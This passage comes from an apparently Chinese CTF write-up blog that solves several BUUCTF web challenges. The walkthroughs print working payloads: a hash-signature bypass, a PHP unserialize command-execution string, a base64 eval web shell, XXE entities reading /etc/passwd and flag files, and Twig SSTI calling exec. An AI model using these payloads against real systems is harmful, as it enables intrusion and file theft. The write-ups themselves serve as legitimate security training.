class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, action, param, sign, ip</span>):</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)  <span class="comment"># sandbox是工作目录</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):          <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span>(<span class="params">self</span>):</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()): <span class="comment"># 签名合法性验证</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">                    result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span>(<span class="params">self</span>):</span> <span class="comment"># 跳转到getSign函数</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span>():</span> <span class="comment"># 获取param</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span>():</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;code.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span>(<span class="params">param</span>):</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span>(<span class="params">action, param</span>):</span> <span class="comment"># secert_key随机生成；返回十六进制数据字符串。此处通过get_sign获取sign</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">content</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span>(<span class="params">param</span>):</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>hint提示：flag在flag.txt中</p>
<p>而这些URL中，访问并读取文件，需要先进入De1ta方法以执行$task.Exec()$</p>
<p>而Exec()方法中，需要先执行$scan$方法，将flag.txt读取到工作目录，再执行$read$方法，读取flag.txt文件</p>
<p>但是，这些要通过$checkSign$方法，即签名合法性验证，而签名合法性验证中的随机数$os.urandom$是不可知的</p>
<p>代码中提供了$getSign$方法</p>
<p>payload1：</p>
<p>注意到求$sign$值时，算式为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashlib.md5(secert_key + param + action).hexdigest()</span><br></pre></td></tr></table></figure>
<p>md5内部的执行方法为，将secert_key、param 、action三个变量拼接后求md5值</p>
<p>故</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5(secert_key+flag.txtscan)</span><br></pre></td></tr></table></figure>
<p>和</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5(secert_key+flag.txt+scan)</span><br></pre></td></tr></table></figure>
<p>具有相同效果</p>
<p>首先获取正确的sign</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;GET &#x2F;geneSign?param&#x3D;flag.txtread HTTP&#x2F;1.1</span><br></pre></td></tr></table></figure>
<p>得到sign</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ca9144ab9ad55da2939e81f98bec8ca2</span><br></pre></td></tr></table></figure>
<p>然后</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;De1ta?param&#x3D;flag.txt HTTP&#x2F;1.1</span><br><span class="line">···</span><br><span class="line">Cookie: action&#x3D;readscan;sign&#x3D;ca9144ab9ad55da2939e81f98bec8ca2;</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<p>payload2：hash扩展攻击</p>
<p>原理在这（没看）：<a target="_blank" rel="noopener" href="https://joychou.org/web/hash-length-extension-attack.html">https://joychou.org/web/hash-length-extension-attack.html</a></p>
<p>用工具HashPump跑一下，具体如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;GET &#x2F;geneSign?param&#x3D;flag.txt HTTP&#x2F;1.1</span><br><span class="line">得到签名xxx</span><br><span class="line">HashPump运行后得到yyy</span><br><span class="line">GET &#x2F;De1ta?param&#x3D;flag.txt HTTP&#x2F;1.1</span><br><span class="line">···</span><br><span class="line">Cookie: action&#x3D;readscan;sign&#x3D;yyy;</span><br></pre></td></tr></table></figure>
<h1 id="phpweb"><a href="#phpweb" class="headerlink" title="phpweb"></a>phpweb</h1><p>来源：网鼎杯2020朱雀组</p>
<p>考察：php反序列化</p>
<p>进入页面，扫描目录，没有东西。</p>
<p>查看源码，发现有隐藏提交的两个参数func和p</p>
<p>尝试提交func=system&amp;p=ls，提示hacker，说明有过滤</p>
<p>读取index.php，看看过滤了哪些函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func&#x3D;readfile&amp;p&#x3D;index.php</span><br></pre></td></tr></table></figure>
<p>得到</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$disable_fun</span> = <span class="keyword">array</span>(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;phpinfo&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;proc_terminate&quot;</span>,<span class="string">&quot;touch&quot;</span>,<span class="string">&quot;escapeshellcmd&quot;</span>,<span class="string">&quot;escapeshellarg&quot;</span>,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;substr_replace&quot;</span>,<span class="string">&quot;call_user_func_array&quot;</span>,<span class="string">&quot;call_user_func&quot;</span>,<span class="string">&quot;array_filter&quot;</span>, <span class="string">&quot;array_walk&quot;</span>,  <span class="string">&quot;array_map&quot;</span>,<span class="string">&quot;registregister_shutdown_function&quot;</span>,<span class="string">&quot;register_tick_function&quot;</span>,<span class="string">&quot;filter_var&quot;</span>, <span class="string">&quot;filter_var_array&quot;</span>, <span class="string">&quot;uasort&quot;</span>, <span class="string">&quot;uksort&quot;</span>, <span class="string">&quot;array_reduce&quot;</span>,<span class="string">&quot;array_walk&quot;</span>, <span class="string">&quot;array_walk_recursive&quot;</span>,<span class="string">&quot;pcntl_exec&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwrite&quot;</span>,<span class="string">&quot;file_put_contents&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gettime</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$p</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$result</span> = call_user_func(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">    <span class="variable">$a</span>= gettype(<span class="variable">$result</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$a</span> == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;Y-m-d h:i:s a&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$func</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;func&quot;</span>];</span><br><span class="line"><span class="variable">$p</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;p&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$func</span> != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="variable">$func</span> = strtolower(<span class="variable">$func</span>);</span><br><span class="line">    <span class="keyword">if</span> (!in_array(<span class="variable">$func</span>,<span class="variable">$disable_fun</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> gettime(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Hacker...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>过滤了太多，一时语塞</p>
<p>代码出现了类，wp提示此处可以序列化绕过</p>
<p>最终的payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(&quot;cat $(find &#x2F; -name flag)&quot;)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func&#x3D;unserialize&amp;p&#x3D;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:25:&quot;cat $(find &#x2F; -name flag*)&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>此处利用了cat的一个方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat $(文件列表)</span><br></pre></td></tr></table></figure>
<p>可以显示所有文件列表的内容</p>
<h1 id="CheckIN"><a href="#CheckIN" class="headerlink" title="CheckIN"></a>CheckIN</h1><p>来源：GKCTF2020</p>
<p>考察：文件上传，文件包含</p>
<p>进入页面，给了一段源代码，分析可知以GET方式提交Ginkgo变量，且值要加密</p>
<p>尝试提交</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?Ginkgo&#x3D;JF9HRVRbY21kXTs&#x3D;&amp;cmd&#x3D;system(&#39;ls&#39;)</span><br><span class="line"># $_GET[cmd];</span><br></pre></td></tr></table></figure>
<p>无任何回显，说明过滤了system函数</p>
<p>也不能一个个去fuzz啊，wp提示可以看phpinfo中disable_function有哪些</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?Ginkgo&#x3D;cGhwaW5mbygpOw&#x3D;&#x3D;</span><br><span class="line"># phpinfo();</span><br></pre></td></tr></table></figure>
<p>看到过滤了大部分可以直接执行命令的php函数</p>
<p>直接用蚁剑连接，密码为123</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?Ginkgo&#x3D;ZXZhbCgkX1BPU1RbMTIzXSk7</span><br><span class="line"># eval($_POST[123]);</span><br></pre></td></tr></table></figure>
<p>可以看到根目录下有flag、readflag</p>
<p>flag打开没有东西</p>
<p>readflag打开是乱码，应该是通过readflag读取flag</p>
<p>php版本为7.4，存在漏洞，将<a target="_blank" rel="noopener" href="https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php">https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php</a> 下载后修改，改为执行readflag</p>
<p>访问</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?Ginkgo&#x3D;ZXZhbCgkX1BPU1RbMTIzXSk7</span><br><span class="line">post:123&#x3D;include(&#39;&#x2F;tmp&#x2F;cmd.php&#39;);</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<h1 id="Fake-XML-cookbook"><a href="#Fake-XML-cookbook" class="headerlink" title="Fake XML cookbook"></a>Fake XML cookbook</h1><p>来源：NCTF2019</p>
<p>考察：XXE（XML注入）</p>
<p>访问页面，需要输入用户名密码。</p>
<p>抓包。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;user&gt;&lt;username&gt;admin&lt;&#x2F;username&gt;&lt;password&gt;password&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;</span><br></pre></td></tr></table></figure>
<p>说明为XML格式提交。</p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">  &lt;!ENTITY admin SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;</span><br><span class="line">  ]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;admin;&lt;&#x2F;username&gt;&lt;password&gt;123456&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;</span><br></pre></td></tr></table></figure>
<h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><p>参考：<a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/175451.html%EF%BC%8C">https://www.freebuf.com/vuls/175451.html，</a></p>
<p>全称：XML External Entity Injection，xml外部实体注入</p>
<p>原理：没有禁止外部实体的加载，导致可加载恶意外部文件；xxe漏洞触发的点往往是可以上传xml文件的位置</p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a[</span><br><span class="line">  &lt;!ENTITY b SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">  ]&gt;</span><br><span class="line">&lt;c&gt;&amp;b;&lt;&#x2F;c&gt;</span><br></pre></td></tr></table></figure>
<p>用途：读取任意文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">  &lt;!ENTITY admin SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;</span><br><span class="line">  ]&gt;</span><br></pre></td></tr></table></figure>
<h1 id="Unicorn-shop"><a href="#Unicorn-shop" class="headerlink" title="Unicorn shop"></a>Unicorn shop</h1><p>来源：ASIS 2019</p>
<p>考察：Unicode编码</p>
<p>进入页面，有两个输入框</p>
<p>输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1&amp;price&#x3D;2</span><br></pre></td></tr></table></figure>
<p>提示 wrong commodity</p>
<p>输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1&amp;price&#x3D;2.2</span><br></pre></td></tr></table></figure>
<p>提示 only one char</p>
<p>看wp，说第一句话提示输入第四个货物，第二句话提示使用unicode输入一个数值超过1337的字符</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1&amp;price&#x3D;万</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<h1 id="Cookie-is-so-stable"><a href="#Cookie-is-so-stable" class="headerlink" title="Cookie is so stable"></a>Cookie is so stable</h1><p>来源：BJDCTF2020</p>
<p>考察：SSTI</p>
<p>网页注释提示关注cookie</p>
<p>在flag.php中，提交ID=admin抓包后发现，服务器会在cookie处返回客户端user值（提交的ID）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: UM_distinctid&#x3D;17823fefa139-00a2ebf39891858-47534130-13c680-17823fefa14ba; PHPSESSID&#x3D;a26ef3157c7bf73a7653ec6b3287ebb5; user&#x3D;admin</span><br></pre></td></tr></table></figure>


<p>I![CTF-wp-BUUCTF-Web 引擎判断](.\pic\CTF-wp-BUUCTF-Web 引擎判断.png)</p>
<p>另外</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;7*&#39;7&#39;&#125;&#125; 回显7777777 &#x3D;&#x3D;&gt; Jinja2</span><br><span class="line">&#123;&#123;7*&#39;7&#39;&#125;&#125; 回显49 &#x3D;&#x3D;&gt; Twig </span><br></pre></td></tr></table></figure>


<p>为Twig</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: UM_distinctid&#x3D;17823fefa139-00a2ebf39891858-47534130-13c680-17823fefa14ba; PHPSESSID&#x3D;a26ef3157c7bf73a7653ec6b3287ebb5; user&#x3D;&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat &#x2F;flag&quot;)&#125;&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="SSTI引擎判断"><a href="#SSTI引擎判断" class="headerlink" title="SSTI引擎判断"></a>SSTI引擎判断</h2><p>I![CTF-wp-BUUCTF-Web 引擎判断](.\pic\CTF-wp-BUUCTF-Web 引擎判断.png)</p>
<p>另外</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;7*&#39;7&#39;&#125;&#125; 回显7777777 &#x3D;&#x3D;&gt; Jinja2</span><br><span class="line">&#123;&#123;7*&#39;7&#39;&#125;&#125; 回显49 &#x3D;&#x3D;&gt; Twig </span><br></pre></td></tr></table></figure>


<h1 id="bottom标签"><a href="#bottom标签" class="headerlink" title="bottom标签"></a>bottom标签</h1>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/02/28/CTF-wp-BUUCTF-Web/" data-id="ckluk74e00007mkus0voo1jgw" data-title="CTF-wp-BUUCTF Web" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-CTF-Web-php" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/02/26/CTF-Web-php/" class="article-date">
  <time class="dt-published" datetime="2021-02-26T00:57:01.000Z" itemprop="datePublished">2021-02-26</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/02/26/CTF-Web-php/">CTF-Web-php</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="CTFHub"><a href="#CTFHub" class="headerlink" title="CTFHub"></a>CTFHub</h1><h2 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h2><p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44732566/article/details/104802676">https://blog.csdn.net/weixin_44732566/article/details/104802676</a></p>
<p>考察：利用LD_PRELOAD绕过disable_function</p>
<p>使用蚁剑连接，密码为ant</p>
<p>连接上后，在根目录/下发现flag，无法打开</p>
<p>做法1：手工绕过</p>
<p>shell.php</p>
